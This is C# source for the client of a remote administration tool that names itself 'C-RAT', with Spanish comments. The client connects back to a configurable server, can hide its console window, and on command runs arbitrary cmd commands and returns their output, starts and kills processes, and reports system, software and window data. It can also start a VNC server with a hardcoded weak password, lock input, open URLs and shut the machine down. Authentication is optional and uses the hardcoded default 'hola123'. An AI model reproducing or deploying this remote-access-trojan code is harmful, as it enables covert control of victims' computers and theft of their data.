#region

using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using Cliente.Negocio;
using Common;
using Common.Lib;

#endregion

namespace Cliente.Servicio
{
    internal class Program
    {
        private  static string _ipServidor = "127.0.0.1";
        private  static int _puertoServidor = 40000;
        private const int TiempoEsperaReconexion = 1000; //en ms.

        /*Parametros del Cliente*/
        private static Boolean TienePassword = false;
        private static Boolean MostrarAvisoDePassword = false;
        private static Boolean MostrarConsola = true;
        private static Boolean PermitirParametros = true;

        /**/
        private static String passwordDelCliente = "hola123";
        private static String passwordRecibida = "";

        //Servidor VNC
        private static String passwordServidorVNC = "pass";
        private static int puertoServidorVNC = 9999;


        private static TcpClient _client;
        private static IPEndPoint Point;
        private static readonly NegocioCliente Servicio = new NegocioCliente();
        private static void Main(String[] args)
        {
            
            if (PermitirParametros)
            {
                EvaluarParametrosRecibidos(args);
            }
            Point = new IPEndPoint(IPAddress.Parse(_ipServidor), _puertoServidor);
            if (!MostrarConsola)
                ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0); //oculto el proceso de la consola.
            InitCommonControls();
            Console.Out.WriteLine("Cliente--");
            if (TienePassword && MostrarAvisoDePassword)
                Servicio.MostrarMsgBox("La password asociada a este cliente es: \n\n" + passwordDelCliente, "Password!",
                                       32);
            Conectar();
            Process.GetCurrentProcess().WaitForExit();
        }


        private static void Conectar()
        {
            try
            {
                _client = TimeOutSocket.Conectar(Point, TiempoEsperaReconexion);
                if (_client != null)
                {
                    Console.Out.WriteLine("Conectado!");
                    int protocol = (int) Protocolo.Cliente.Conectado;
                    NetData d = Servicio.GenerarInformacionDelSistema(protocol);
                    d.AddDato("TienePassword", TienePassword.ToString());
                        // informo al servidor si estoy protegido por password o no.
                    Enviar(d);
                    byte[] datosLeidos = new byte[_client.ReceiveBufferSize];
                    _client.GetStream().BeginRead(datosLeidos, 0, datosLeidos.Length, Leer, datosLeidos);
                }
            }
            catch (Exception)
            {
                Console.Out.WriteLine("Intentando conectar con el servidor " + Point);
                CerrarConexiones();
                Conectar();
            }
        }

        private static void Leer(IAsyncResult ar)
        {
            try
            {
                _client.GetStream().EndRead(ar); //acabo la lectura (llamada de forma recursiva anteriormente)
                byte[] datosLeidos = ar.AsyncState as byte[];
                Procesar((NetData) Serializador.Deserializar(datosLeidos));
                _client.GetStream().BeginRead(datosLeidos, 0, datosLeidos.Length, Leer, datosLeidos);
            }
            catch
            {
                Thread.Sleep(TiempoEsperaReconexion);
                CerrarConexiones();
                Conectar();
            }
        }

        private static void Procesar(NetData objRecibido)
        {
            Console.Out.WriteLine("Recibido msg con codigo de protocolo [" + objRecibido.CodigoDeProtocolo + "]");
            /*mientras  el acceso no este validado...*/
            if (comprobarAuth() == false)
            {
                Boolean auth = false;
                if (objRecibido.CodigoDeProtocolo == (int) Protocolo.Servidor.EnviarPassword)
                {
                    auth = validarRespuestaPassword(objRecibido);
                }
                else
                {
                    Enviar(Servicio.GenerarPeticionPassword());
                }

                /*Si el servidor no esta validado le pido el password para que se valide...*/
                if (auth == false)
                {
                    return;
                }
            }
            //Si el server esta autorizado (Password -> OK) proceso los msg recibidos. 

            switch (objRecibido.CodigoDeProtocolo)
            {
                    //Ventanas
                case (int) Protocolo.Servidor.PedirInfoVentanas:
                    NetData d = Servicio.GenerarInfoVentanasVisibles((int) Protocolo.Cliente.RespuestaInfoVentanas);
                    Enviar(d);
                    break;
                    //Acciones de Ventana.
                case (int) Protocolo.Servidor.MinimizarVentana:
                case (int) Protocolo.Servidor.BloquearVentana:
                case (int) Protocolo.Servidor.DesbloquearVentana:
                case (int) Protocolo.Servidor.CambiarTituloVentana:
                    try
                    {
                        Servicio.ProcesarAccionesDeVentana(objRecibido);
                        Enviar(NetData.RespuestaOk());
                    }
                    catch (Exception ex)
                    {
                        Enviar(NetData.RespuestaError());
                    }
                    break;
                    //acciones de procesos.
                case (int)Protocolo.Servidor.MatarProceso:
                case (int)Protocolo.Servidor.EjecutarProceso:
                    try
                    {
                        Servicio.ProcesarAccionesDeProcesos(objRecibido);
                        Enviar(NetData.RespuestaOk());
                    }
                    catch (Exception ex)
                    {
                        Enviar(NetData.RespuestaError());
                    }
                    break;
                case (int) Protocolo.Servidor.PedirInfoSoftware:
                    NetData infoSoft =
                        Servicio.GenerarInfoSoftwareDelSistema((int) Protocolo.Cliente.RespuestaInfoSoftware);
                    Enviar(infoSoft);
                    break;
                case (int)Protocolo.Servidor.PedirInfoProcesos:
                    NetData infoProc =
                        Servicio.GenerarInfoProcesosDelSistema((int)Protocolo.Cliente.RespuestaInfoProcesos);
                    Enviar(infoProc);
                    break;                
                    //accion MsgBox
                case (int) Protocolo.Servidor.MostrarMsgBox:
                    Servicio.MostrarMsgBox(objRecibido.GetDato("Msg"),
                                           objRecibido.GetDato("Titulo"),
                                           int.Parse(objRecibido.GetDato("Tipo")));
                    break;
                case (int) Protocolo.Servidor.IniciarEscritorioRemoto:
                    try
                    {
                        Servicio.IniciarServidorVnc(passwordServidorVNC, puertoServidorVNC, "Servidor VNC C-RAT");
                    }
                    catch (Exception ex)
                    {
                        Console.Out.WriteLine(
                            "No se pudo iniciar el servidor. Compruebe que no se encuentra ya iniciado.");
                    }
                    break;
                case (int) Protocolo.Servidor.BloquearSistema:
                    Servicio.BloquearEntradaDelSistema(true);
                    break;
                case (int) Protocolo.Servidor.DesbloquearSistema:
                    Servicio.BloquearEntradaDelSistema(false);
                    break;
                case (int) Protocolo.Servidor.AbrirPaginaWeb:
                    String url = objRecibido.GetDato("URL");
                    Servicio.AbrirPaginaWeb(url);
                    break;
                case (int) Protocolo.Servidor.ApagarEquipo:
                    Servicio.RealizarAccionApagado(int.Parse(objRecibido.GetDato("Flag")));
                    break;                
                case (int) Protocolo.Servidor.EnviarCmdCommandRemoto:
                    string respuesta = Servicio.ObtenerRespuestaComandoCmd(objRecibido.GetDato("Comando"));
                    NetData respNd = new NetData((int) Protocolo.Cliente.RespuestaComandoCmd);
                    respNd.AddDato("RespuestaCmd",respuesta);
                    Enviar(respNd);
                    break;
                case (int) Protocolo.Servidor.DesconectarCliente:
                    Console.Out.WriteLine("El servidor ha finalizado la Conexion.");
                    Environment.Exit(0);
                    break;

            }
        }

        private static void Enviar(NetData obj)
        {
            lock (_client)
            {
                byte[] datos = Serializador.Serializar(obj);
                _client.GetStream().BeginWrite(datos, 0, datos.Length, wrText(datos.Length), obj);

                //_client.GetStream().Write(datos, 0, datos.Length);
                _client.GetStream().Flush();
            }
        }

        public static AsyncCallback wrText(int d)
        {
            Console.Out.WriteLine("Envio datos al servidor [{0} : {1}]", Point.Address,
                                  Point.Port + " [ " + (float) d/1000 + " Kb's ]");
            return null;
        }

        private static void CerrarConexiones()
        {
            try
            {
                _client.Close();
            }
            catch (Exception)
            {
            }
        }


        private static Boolean comprobarAuth()
        {
            /*Si no tiene password la autorizacion siempre es correcta.*/
            if (!TienePassword)
                return true;

            return passwordDelCliente == passwordRecibida;
        }

        private static Boolean validarRespuestaPassword(NetData datosRecibidos)
        {
            String psw = datosRecibidos.GetDato("Password");
            if (psw == passwordDelCliente)
            {
                passwordRecibida = psw;
                Enviar(new NetData((int) Protocolo.Cliente.AutentificacionCorrecta));
                return true;
            }
            else
            {
                Enviar(new NetData((int) Protocolo.Cliente.AutentificacionIncorrecta));
                return false;
            }
        }

        /// <summary>
        ///     Muestra en consola las referencias a las Dll(tanto propias como del Framework .NET) que necesita el cliente para funcionar
        ///     correctamente el cliente.
        /// </summary>
        private static void MostrarDependendias()
        {
            var ensamblados = AppDomain.CurrentDomain
                                      .GetAssemblies()
                                      .Where(a => !a.IsDynamic)
                                      .Select(a => a.Location);

            foreach (var asam in ensamblados.ToArray())
            {                
                Console.Out.WriteLine("" + asam);
            }
        }

        /// <summary>
        /// Evalua los parametros recibidos, en caso de que el cliente acepte parametros en su ejecución.
        /// </summary>
        /// <param name="parametros"></param>
        private static void EvaluarParametrosRecibidos(String[] parametros)
        {
            if (parametros.Length >= 2)
            {
                try
                {
                    IPAddress ip;
                    int port;
                    bool ipValida = !string.IsNullOrEmpty(parametros[0]) && IPAddress.TryParse(parametros[0], out ip);
                    bool portValido = int.TryParse(parametros[1], out port);

                    if (ipValida && portValido)
                    {
                        _ipServidor = parametros[0];
                        _puertoServidor = port;
                    }

                    if (parametros.Length >= 3)
                    {
                        if (parametros[2] == "hide")
                            MostrarConsola = false;
                        
                    }
                if (parametros.Length >= 4)
                    {
                            passwordDelCliente = parametros[3];
                            TienePassword = true;                        
                    }
                            

                }
                catch (Exception ex)
                {
                    return;
                }

            }                
        }
        
        [DllImport("Comctl32.dll")]
        private static extern void InitCommonControls();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


    }


    internal class TimeOutSocket
    {
        private static bool ConexionExitosa;
        private static Exception SocketException;
        private static readonly ManualResetEvent TimeoutObject = new ManualResetEvent(false);

        public static TcpClient Conectar(IPEndPoint point, int timeout)
        {
            TimeoutObject.Reset();
            SocketException = null;

            string serverip = Convert.ToString(point.Address);
            int serverport = point.Port;
            TcpClient tcpclient = new TcpClient();

            tcpclient.BeginConnect(serverip, serverport,
                                   CallBackMethod, tcpclient);

            if (TimeoutObject.WaitOne(timeout, false))
            {
                if (ConexionExitosa)
                {
                    return tcpclient;
                }
                else
                {
                    throw SocketException;
                }
            }
            else
            {
                tcpclient.Close();
                throw new TimeoutException("TimeOut Exception");
            }
        }

        private static void CallBackMethod(IAsyncResult asyncresult)
        {
            try
            {
                ConexionExitosa = false;
                TcpClient tcpclient = asyncresult.AsyncState as TcpClient;

                if (tcpclient.Client != null)
                {
                    tcpclient.EndConnect(asyncresult);
                    ConexionExitosa = true;
                }
            }
            catch (Exception ex)
            {
                ConexionExitosa = false;
                SocketException = ex;
            }
            finally
            {
                TimeoutObject.Set();
            }
        }
    }
}